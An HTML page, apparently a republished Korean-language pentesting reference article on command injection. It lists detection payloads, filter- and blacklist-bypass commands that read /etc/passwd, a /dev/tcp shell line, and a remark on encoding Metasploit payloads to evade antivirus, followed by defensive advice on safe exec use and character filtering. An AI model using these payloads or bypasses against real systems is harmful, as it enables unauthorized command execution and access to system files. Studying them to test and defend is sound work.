@@ -1,0 +1,219 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Command Injection — PIXN</title>
+  <meta name="description" content="Command Injection — Vulnerabilities, attack surfaces, and defensive verification notes.">
+  <meta property="og:title" content="Command Injection — PIXN"><meta property="og:description" content="Command Injection — Vulnerabilities, attack surfaces, and defensive verification notes."><meta property="og:image" content="https://whgusals84.github.io/pixn-security/og.png"><meta name="twitter:card" content="summary_large_image">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+  <header data-site-header data-active="reference"></header>
+  <main class="page article-page" id="main">
+    <header class="article-heading">
+      <p class="eyebrow"><a href="/reference/">Reference</a> / <a href="/reference/attack/">Web Security</a></p>
+      <h1>Command Injection</h1>
+      <time datetime="2021-09-10">SEPTEMBER 10, 2021</time>
+    </header>
+    <article class="article-body"><h2 id="introduction">Introduction</h2>
+<p>Command Injection은 어플리케이션이 systemcall 등 OS command를 사용하는 부분이 있거나, application단에서 별도의 command를 처리할 수 있는 경우 공격자가 Injection을 통해 의도한 명령을 수행하는 공격 기법을 의미합니다.</p>
+<h2 id="offensive-techniques">Offensive techniques</h2>
+<h3 id="detect">Detect</h3>
+<p>소스코드를 볼 수 있는 Whitebox나 Graybox 테스팅에서 exec 등 command 처리를 하는 함수 위주로 분석하면 쉽게 찾을 수 있지만, 온전하게 Blackbox 테스팅을 해야하는 경우 이 구간을 식별하는게 쉽지는 않습니다.</p>
+<p>Fuzzing을 통해 Command Injection에 영향을 줄 수 있는 요청을 전송하고, 이에 따른 Response와 Response-time 등을 보고 백엔드에 Command 처리를 하는 부분이 있는지 식별해야합니다.</p>
+<pre><code class="language-bash hljs"><span class="hljs-comment"># Original</span>
+/proc?filename<span class="hljs-operator">=</span>test.txt
+
+<span class="hljs-comment"># Backend</span>
+exec<span class="hljs-operator">(</span><span class="hljs-string">&quot;cat &quot;</span>+filename<span class="hljs-operator">)</span>
+</code></pre>
+<pre><code>/proc?filename=test.txt`ping -c 5 127.0.0.1`
+/proc?filename=test.txt$(ping -c 5 127.0.0.1)
+/proc?filename=test.txt|ping -c 5 127.0.0.1|
+/proc?filename=test.txt&amp;ping -c 5 127.0.0.1&amp;
+/proc?filename=test.txt\nping -c 5 127.0.0.1\n
+/proc?filename=test.txt&gt;ping -c 5 127.0.0.1&gt;
+/proc?filename=test.txt&lt;ping -c 5 127.0.0.1&gt;
+/proc?filename=test.txt-ping -c 5 127.0.0.1
+/proc?filename=test.txt;ping -c 5 127.0.0.1;
+등...
+</code></pre>
+<p>백엔드에서 filename을 cli로 처리하는 경우 위 특수문자 구문으로 인해 공격자가 의도한 명령 <code>ping -c 5 127.0.0.1</code> 이 수행되면 localhost에 5번 ping을 날리기 때문에 5초의 딜레이가 발생합니다. 이러한 경우 Response time 보고 체크하면 실제 명령이 수행 됬는지 알 수 있습니다.</p>
+<p>(개인적으론 Blind RCE 케이스도 많았기 때문에 ping 이나 sleep으로 time 기반 체크하는게 가장 정확했습니다)</p>
+<p>때때로 어떤 Application들은 파라미터에서 command 자체를 받는 경우도 있습니다. 이러한 경우는 쉽게 식별이 가능합니다.</p>
+<pre><code>/proc?cmd=curl%20api-server.domain/check
+</code></pre>
+<h4 id="polyglot-payload">Polyglot payload</h4>
+<pre><code># case 1
+1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}&quot;;sleep${IFS}9;#${IFS}
+
+# e.g:
+echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}&quot;;sleep${IFS}9;#${IFS}
+echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}&quot;;sleep${IFS}9;#${IFS}
+echo &quot;1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}&quot;;sleep${IFS}9;#${IFS}
+
+# case 2
+/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'&quot;||sleep(5)||&quot;/*`*/
+
+# e.g:
+echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'&quot;||sleep(5)||&quot;/*`*/
+echo &quot;YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'&quot;||sleep(5)||&quot;/*`*/&quot;
+echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'&quot;||sleep(5)||&quot;/*`*/'
+</code></pre>
+<h3 id="exploitation">Exploitation</h3>
+<p>명령을 실행할 수 있기 때문에 OS의 중요정보를 가져오거나, Shell을 내려서 추가적인 공격을 수행할 수 있습니다. Shell을 내리는 방법에는 여러가지가 있겠지만, 간단하게는 nc 등을 이용해서 linsten 시킨 후 접근하여 쉘을 사용하거나 Metasploit을 사용하여 쉘을 내리는 방법이 있습니다. metasploit의 meterpreter shell을 사용하면 대상 시스템에서 다시 행이동 하기 좋기 때문에 만약 내부 침투까지 진행한다면 meterpreter shell을 추천합니다. (물론 백신에 안걸리게 payload encode를 잘 짜야겠죠)</p>
+<h3 id="bypass-protection">Bypass protection</h3>
+<h4 id="bypass-without-space">Bypass without space</h4>
+<p>linux</p>
+<pre><code>cat&lt;/etc/passwd
+root:x:0:0:root:/root:/bin/bash
+
+{cat,/etc/passwd}
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+
+cat$IFS/etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+
+echo${IFS}&quot;RCE&quot;${IFS}&amp;&amp;cat${IFS}/etc/passwd
+RCE
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+
+X=$'uname\x20-a'&amp;&amp;$X
+Linux crashlab 4.4.X-XX-generic #72-Ubuntu
+
+sh&lt;/dev/tcp/127.0.0.1/4242
+
+IFS=,;`cat&lt;&lt;&lt;uname,-a`
+</code></pre>
+<p>Windows</p>
+<pre><code>ping%CommonProgramFiles:~10,-18%IP
+ping%PROGRAMFILES:~10,-5%IP
+</code></pre>
+<h4 id="bypass-with-a-line-return">Bypass with a line return</h4>
+<pre><code>something%0Acat%20/etc/passwd
+</code></pre>
+<h4 id="bypass-characters-filter-via-hex-encoding">Bypass characters filter via hex encoding</h4>
+<p>Linux</p>
+<pre><code>echo -e &quot;\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;/etc/passwd
+
+cat `echo -e &quot;\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;`
+root:x:0:0:root:/root:/bin/bash
+
+abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
+root:x:0:0:root:/root:/bin/bash
+
+`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
+root:x:0:0:root:/root:/bin/bash
+
+xxd -r -p &lt;&lt;&lt; 2f6574632f706173737764
+/etc/passwd
+
+cat `xxd -r -p &lt;&lt;&lt; 2f6574632f706173737764`
+root:x:0:0:root:/root:/bin/bash
+
+xxd -r -ps &lt;(echo 2f6574632f706173737764)
+/etc/passwd
+
+cat `xxd -r -ps &lt;(echo 2f6574632f706173737764)`
+root:x:0:0:root:/root:/bin/bash
+</code></pre>
+<h4 id="bypass-characters-filter">Bypass characters filter</h4>
+<pre><code>echo ${HOME:0:1}
+/
+
+cat ${HOME:0:1}etc${HOME:0:1}passwd
+root:x:0:0:root:/root:/bin/bash
+
+echo . | tr '!-0' '&quot;-1'/
+
+tr '!-0' '&quot;-1' &lt;&lt;&lt; .
+/
+
+cat $(echo . | tr '!-0' '&quot;-1')etc$(echo . | tr '!-0' '&quot;-1')passwd
+root:x:0:0:root:/root:/bin/bash
+</code></pre>
+<h4 id="bypass-blacklisted-words">Bypass Blacklisted words</h4>
+<p>single quote</p>
+<pre><code>w'h'o'am'i
+</code></pre>
+<p>double quote</p>
+<pre><code>w&quot;h&quot;o&quot;am&quot;i
+</code></pre>
+<p>backslash</p>
+<pre><code>w\ho\am\i
+/\b\i\n/////s\h
+</code></pre>
+<p>$@</p>
+<pre><code>who$@ami
+
+echo $0
+-&gt; /usr/bin/zsh
+echo whoami|$0
+</code></pre>
+<p>???</p>
+<pre><code>/???/??t /???/p??s??
+
+test=/ehhh/hmtc/pahhh/hmsswd
+cat ${test//hhh\/hm/}
+cat ${test//hh??hm/}
+</code></pre>
+<p>wildcard(<code>*</code>)</p>
+<pre><code>powershell C:\*\*2\n??e*d.*? # notepad
+@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
+</code></pre>
+<h4 id="bypass-system-hardening-oob">Bypass system hardening (OOB)</h4>
+<p>RCE의 좋은 탐지 방법 중 하나인 OOB는 때때로 시스템 하드닝에 의해 방해받을 수 있습니다. 이러한 경우 여러가지 도구들을 통해서 HTTP/DNS Query가 발생하도록 유도하여 우회하고 Callback을 받을 수 있습니다. 자세한 내용은 &quot;<a href="https://www.hahwul.com/2022/03/11/bypass-system-hardening-rce-oob/">System Hardening을 피해 RCE를 탐지하기 위한 OOB 방법들</a>&quot; 글을 참고해주세요.</p>
+<p><img loading="lazy" src="https://user-images.githubusercontent.com/13212227/157870767-c901c88d-185c-4c41-a858-63db34d61d2c.png" alt="" /></p>
+<h2 id="defensive-techniques">Defensive techniques</h2>
+<p>보통 서비스에서 systemcall 등을 사용해야 하는 경우 application libarary의 기능을 통해 sandbox 처럼 사용자 입력이 쉘 이후로 넘어가지 못하도록 처리하거나 공격에 사용되는 특수문자를 필터링하는 형태로 대응합니다.</p>
+<h3 id="library-protection">Library protection</h3>
+<pre><code class="language-go hljs"><span class="hljs-comment">// golang의 대표적인 exec 방어 처리
+</span><span class="hljs-comment"></span><span class="hljs-comment">// 이 경우 filename에 아무리 특수문자를 넣어 별도의 명령을 실행하려고 해도 cat 하위의 인자값으로만 처리됩니다.
+</span><span class="hljs-comment"></span>cmd <span class="hljs-operator">:=</span> exec<span class="hljs-punctuation">.</span><span class="hljs-title function_">Command</span><span class="hljs-punctuation">(</span><span class="hljs-string">&quot;cat&quot;</span><span class="hljs-punctuation">,</span> filename<span class="hljs-punctuation">)</span>
+err <span class="hljs-operator">:=</span> cmd<span class="hljs-punctuation">.</span><span class="hljs-title function_">Start</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>
+</code></pre>
+<p>다만 보통 이러한 과정이 개발에 불편함을 가지기 때문에 명령을 유동적으로 받는 경우 아래와 같이 <code>bash -c</code> 등으로 처리하는 경우도 많습니다. (이러한 경우는 취약하겠죠)</p>
+<pre><code class="language-go hljs">cmd <span class="hljs-operator">:=</span> exec<span class="hljs-punctuation">.</span><span class="hljs-title function_">Command</span><span class="hljs-punctuation">(</span><span class="hljs-string">&quot;bash&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;-c&quot;</span><span class="hljs-punctuation">,</span> afterCmd<span class="hljs-punctuation">)</span>
+err <span class="hljs-operator">:=</span> cmd<span class="hljs-punctuation">.</span><span class="hljs-title function_">Start</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>
+</code></pre>
+<h3 id="escape-special-chars">Escape special chars</h3>
+<p>특수문자 제한의 경우 공격에 주로 사용되는 특수문자에 대해 제한하는 형태로 처리됩니다.</p>
+<ul>
+<li><code>|</code></li>
+<li><code>$</code></li>
+<li><code>(</code></li>
+<li><code>)</code></li>
+<li><code>&amp;</code></li>
+<li><code>|</code></li>
+<li><code>\r\n</code> (CRLF)</li>
+<li><code>&gt;</code></li>
+<li><code>&lt;</code></li>
+<li><code>-</code></li>
+<li><code>;</code></li>
+</ul>
+<ul>
+<li>등</li>
+</ul>
+<h2 id="tools">Tools</h2>
+<ul>
+<li><a href="https://github.com/commixproject/commix">https://github.com/commixproject/commix</a></li>
+</ul>
+<h2 id="articles">Articles</h2>
+<ul>
+<li>https://www.hahwul.com/2018/05/26/hacking-evasion-technique-using/</li>
+<li>https://www.hahwul.com/2022/03/11/bypass-system-hardening-rce-oob/</li>
+</ul>
+<h2 id="references">References</h2>
+<ul>
+<li>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection</li>
+</ul></article>
+    <footer class="article-source"><span>Republished with permission</span><a href="https://www.hahwul.com/cullinan/attack/command-injection/" rel="noopener noreferrer">Original source ↗</a></footer>
+  </main>
+  <footer data-site-footer></footer><script src="/assets/site.js"></script>
+</body>
+</html>
